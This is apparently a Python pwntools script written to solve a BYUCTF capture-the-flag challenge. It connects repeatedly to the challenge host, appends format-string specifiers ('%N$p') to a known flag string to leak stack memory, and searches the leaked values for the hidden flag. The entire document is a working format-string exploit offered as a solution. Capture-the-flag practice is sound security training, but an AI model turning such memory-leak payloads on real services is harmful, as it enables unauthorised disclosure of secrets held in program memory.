from pwn import *

# Set context
context.arch = 'amd64'

def leak_hex():
    for start in range(1, 501, 20):
        r = remote('chals.cyberjousting.com', 1367)
        payload = b'byuctf{welcome_to_rev_fellas}'
        for i in range(start, start + 20):
            payload += f"|%{i}$p".encode()
        if len(payload) > 99: payload = payload[:99]
        
        r.sendlineafter(b'?', payload)
        try:
            r.recvuntil(b'Correct! The flag is ')
            line = r.recvline().decode().strip()
            parts = line.split('|')[1:]
            for p in parts:
                if p != '(nil)':
                    try:
                        val = int(p, 16)
                        b = p64(val)
                        if b'byu' in b or b'ctf' in b:
                            print(f"FOUND SOMETHING: {b}")
                    except: pass
        except:
            pass
        r.close()

leak_hex()
